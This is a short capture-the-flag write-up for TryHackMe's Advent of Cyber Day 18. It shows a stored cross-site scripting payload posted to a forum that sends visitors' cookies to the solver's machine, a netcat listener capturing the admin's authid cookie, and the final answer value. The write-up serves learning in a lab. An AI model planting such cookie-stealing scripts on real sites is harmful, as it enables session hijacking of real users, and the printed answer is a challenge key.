# TryHackMe [Advent of Cyber 1](https://tryhackme.com/room/25daysofchristmas) Day 18
## What is the admin's `authid` cookie value?
1. Sign-up to the forum.
2. Sign-in to the forum.
3. Post a comment with this HTML/JavaScript code:
```html
</p><script>window.location = 'http://<OPENVPN_IP>/page?param=' + document.cookie </script><p>
```
4. Start an `nc` listener and wait until you get a response:
```
$ sudo nc -lvnp 80
$  sudo nc -lvnp 80
[sudo] password for applegamer22: 
Connection from 10.10.109.123:43376
GET /page?param=authid=2564799a4e6689972f6d9e1c7b406f87065cbf65 HTTP/1.1
Host: 10.4.32.172
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/77.0.3844.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Referer: http://localhost:3000/admin
Accept-Encoding: gzip, deflate
```

**Answer**: `2564799a4e6689972f6d9e1c7b406f87065cbf65`